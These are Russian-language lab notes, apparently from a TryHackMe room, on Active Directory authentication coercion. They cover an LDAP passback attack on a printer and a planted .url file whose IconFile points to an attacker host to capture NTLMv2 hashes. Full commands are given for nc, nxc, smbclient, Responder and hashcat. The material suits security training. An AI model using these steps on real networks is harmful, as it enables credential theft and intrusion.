# AUTHENTICATION COERCION — ПРИНУДИТЕЛЬНАЯ АУТЕНТИФИКАЦИЯ

## Что это

Вместо поиска или подбора паролей — заставляем устройство или пользователя САМИ отправить нам свои учетные данные.

## Два типа coercion в этой комнате

1. LDAP Passback (атака на принтеры/устройства)
2. File-based coercion (через .url файлы на сетевой шаре)


# LDAP PASSBACK ATTACK

## Что это

Многие устройства (принтеры, сканеры, МФУ) интегрируются с AD через LDAP.
Они хранят учетные данные для подключения к LDAP.

Атака: подменяем LDAP сервер на свой, устройство отправляет нам свои креды.

## Почему это работает

- Дефолтные пароли на устройствах (admin:admin)
- Учетки для LDAP часто имеют избыточные права
- Используется незашифрованный LDAP (порт 389) вместо LDAPS
- Пароли не ротируются годами

## Как провести атаку

1. Найти веб-интерфейс устройства (например, http://printer.thm.loc)
2. Зайти под admin:admin (или другими дефолтными кредами)
3. Найти настройки LDAP
4. Сменить IP LDAP сервера на свой (tun0 IP) и другой порт (например 3489)
5. Поднять слушатель: nc -lvnp 3489
6. Нажать "Test Connection"
7. Получить Bind DN и пароль в открытом виде

## Что мы получаем

Пример вывода:
0Y`T;CN=svc.ldap,OU=Service Accounts,DC=thm,DC=loc<Pr1ntBind2025!%

Bind DN: CN=svc.ldap,OU=Service Accounts,DC=thm,DC=loc
Пароль: Pr1ntBind2025!%

## Проверка учетки
nxc smb <IP_DC> -u 'svc.ldap' -p 'Pr1ntBind2025!%'


# FILE-BASED COERCION (через .url файлы)

## Что это

Кладем специальный файл на сетевую шару. Когда пользователь открывает папку в Windows Explorer, система автоматически пытается загрузить иконку файла по указанному UNC пути и отправляет его NTLMv2 хэш нам.

## Почему это работает

Windows Explorer рендерит иконки файлов сразу при открытии папки.
.url файлы имеют поле IconFile с UNC путем (\\IP\share\icon.ico)
Windows пытается загрузить иконку → SMB аутентификация → отправка NTLMv2 хэша

## Создание вредоносного .url файла

cat > @Shortcut.url << 'EOF'
[InternetShortcut]
URL=http://thm.loc
WorkingDirectory=thm
IconFile=\\IP_ATTACKER\icons\icon.ico
IconIndex=1
EOF

Важно: кавычки вокруг EOF нужны, чтобы двойные слеши не превратились в одинарные.

Файл называется @Shortcut.url — символ @ ставит его в начало списка файлов.

## Подготовка слушателя (Responder)

sudo responder -I tun0

Responder слушает на портах 445 (SMB), 139, 389, 80, 443 и ловит NTLMv2 хэши.

## Загрузка файла на шару

smbclient //SERVER1.thm.loc/shared-docs -U 'THM\alice.moore%MegaCorp01!'
put @Shortcut.url

## Что получаем

Когда пользователь откроет папку, Responder ловит NTLMv2 хэш:

[SMB] NTLMv2-SSP Username : THM\sarah.jones
[SMB] NTLMv2-SSP Hash : sarah.jones::THM:11223344... (NetNTLMv2)

## Взлом хэша (Hashcat)

hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --force

Режим 5600 = NetNTLMv2

После взлома получаем пароль в plain text.

## Важное различие

- LDAP Passback → сразу plaintext пароль
- File-based coercion → NTLMv2 хэш (нужно взламывать)

# RESPONDER — ключевые возможности

Слушает порты:
- 445 (SMB) — для захвата NTLMv2 хэшей
- 139 (NetBIOS)
- 389 (LDAP)
- 80, 443 (HTTP/HTTPS)
- 21 (FTP)

Запуск на нужном интерфейсе:
sudo responder -I tun0

Доп. полезные флаги:
sudo responder -I tun0 -v              (verbose)
sudo responder -I tun0 -F              (Force режим)
sudo responder -I tun0 -w              (WPAD прокси)